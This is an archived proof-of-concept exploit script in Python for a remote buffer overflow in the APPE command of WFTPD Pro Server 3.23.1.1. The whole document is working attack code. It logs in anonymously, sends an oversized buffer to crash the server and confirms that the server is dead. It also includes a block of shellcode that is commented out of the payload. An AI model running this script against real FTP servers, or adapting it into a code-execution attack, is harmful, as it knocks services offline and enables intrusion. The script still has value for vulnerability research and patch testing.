<html><head><title>WFTPD Pro Server 3.23.1.1 (APPE) Remote Buffer Overflow PoC</title></head><pre>#!/usr/bin/env python

import sys
import struct
import ftplib

print &quot;WFTPD Pro Server 3.23.1.1 Buffer Overflow (Only a DOS currently, simple POC)&quot;
print &quot;Copyright (c) Joxean Koret&quot;
print

target = &quot;192.168.1.13&quot;
targetPort = &quot;21&quot;

try:
    ftp = ftplib.FTP()

    print &quot;[+] Connecting to target &quot;
    msg = ftp.connect(target, targetPort)
    print &quot;[+] Ok. Target banner&quot;
    print msg
    print
    print &quot;[+] Trying to logging anonymously&quot;
    msg = ftp.login() # Anonymous
    print &quot;[+] Ok. Message&quot;
    print msg
    print
except:
    print &quot;[!] Exploit doesn't work. &quot; + str(sys.exc_info()[1])
    sys.exit(0)


a = &quot;\\\\A:&quot;

for i in range(6):
    a += a

print &quot;[+] Padding length &quot; + str(len(a)) + &quot; bytes&quot;

b = &quot;ABCD&quot;

for i in range(4):
    b += b

a = a + &quot;ABCD&quot;*10 + b

shellCode = &quot;&quot;
shellCode += &quot;\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xec&quot;
shellCode += &quot;\x9b\x26\x8c\x83\xeb\xfc\xe2\xf4\x10\xf1\xcd\xc1\x04\x62\xd9\x73&quot;
shellCode += &quot;\x13\xfb\xad\xe0\xc8\xbf\xad\xc9\xd0\x10\x5a\x89\x94\x9a\xc9\x07&quot;
shellCode += &quot;\xa3\x83\xad\xd3\xcc\x9a\xcd\xc5\x67\xaf\xad\x8d\x02\xaa\xe6\x15&quot;
shellCode += &quot;\x40\x1f\xe6\xf8\xeb\x5a\xec\x81\xed\x59\xcd\x78\xd7\xcf\x02\xa4&quot;
shellCode += &quot;\x99\x7e\xad\xd3\xc8\x9a\xcd\xea\x67\x97\x6d\x07\xb3\x87\x27\x67&quot;
shellCode += &quot;\xef\xb7\xad\x05\x80\xbf\x3a\xed\x2f\xaa\xfd\xe8\x67\xd8\x16\x07&quot;
shellCode += &quot;\xac\x97\xad\xfc\xf0\x36\xad\xcc\xe4\xc5\x4e\x02\xa2\x95\xca\xdc&quot;
shellCode += &quot;\x13\x4d\x40\xdf\x8a\xf3\x15\xbe\x84\xec\x55\xbe\xb3\xcf\xd9\x5c&quot;
shellCode += &quot;\x84\x50\xcb\x70\xd7\xcb\xd9\x5a\xb3\x12\xc3\xea\x6d\x76\x2e\x8e&quot;
shellCode += &quot;\xb9\xf1\x24\x73\x3c\xf3\xff\x85\x19\x36\x71\x73\x3a\xc8\x75\xdf&quot;
shellCode += &quot;\xbf\xc8\x65\xdf\xaf\xc8\xd9\x5c\x8a\xf3\x37\xd0\x8a\xc8\xaf\x6d&quot;
shellCode += &quot;\x79\xf3\x82\x96\x9c\x5c\x71\x73\x3a\xf1\x36\xdd\xb9\x64\xf6\xe4&quot;
shellCode += &quot;\x48\x36\x08\x65\xbb\x64\xf0\xdf\xb9\x64\xf6\xe4\x09\xd2\xa0\xc5&quot;
shellCode += &quot;\xbb\x64\xf0\xdc\xb8\xcf\x73\x73\x3c\x08\x4e\x6b\x95\x5d\x5f\xdb&quot;
shellCode += &quot;\x13\x4d\x73\x73\x3c\xfd\x4c\xe8\x8a\xf3\x45\xe1\x65\x7e\x4c\xdc&quot;
shellCode += &quot;\xb5\xb2\xea\x05\x0b\xf1\x62\x05\x0e\xaa\xe6\x7f\x46\x65\x64\xa1&quot;
shellCode += &quot;\x12\xd9\x0a\x1f\x61\xe1\x1e\x27\x47\x30\x4e\xfe\x12\x28\x30\x73&quot;
shellCode += &quot;\x99\xdf\xd9\x5a\xb7\xcc\x74\xdd\xbd\xca\x4c\x8d\xbd\xca\x73\xdd&quot;
shellCode += &quot;\x13\x4b\x4e\x21\x35\x9e\xe8\xdf\x13\x4d\x4c\x73\x13\xac\xd9\x5c&quot;
shellCode += &quot;\x67\xcc\xda\x0f\x28\xff\xd9\x5a\xbe\x64\xf6\xe4\x1c\x11\x22\xd3&quot;
shellCode += &quot;\xbf\x64\xf0\x73\x3c\x9b\x26\x8c&quot;

a = a + &quot;JOXEAN&quot; #+ shellCode

print &quot;[+] Exploiting with a buffer of &quot; + str(len(a)) + &quot; byte(s) ... &quot;

try:
    msg = ftp.sendcmd(&quot;APPE &quot; + a)
    print &quot;[!] Exploit doesn't work [&quot; + msg + &quot;]&quot;
except:
    print &quot;[+] Exploit apparently works. Trying to verify it ... &quot;

    try:
        ftp.connect(target, targetPort)
        print &quot;[!] No, it doesn't work [&quot; + str(sys.exc_info()[1]) + &quot;] :(&quot;
    except:
        print &quot;[!] Ok. Server is dead, exploit successfully executed. &quot;

# milw0rm.com [2006-11-07]</pre></html>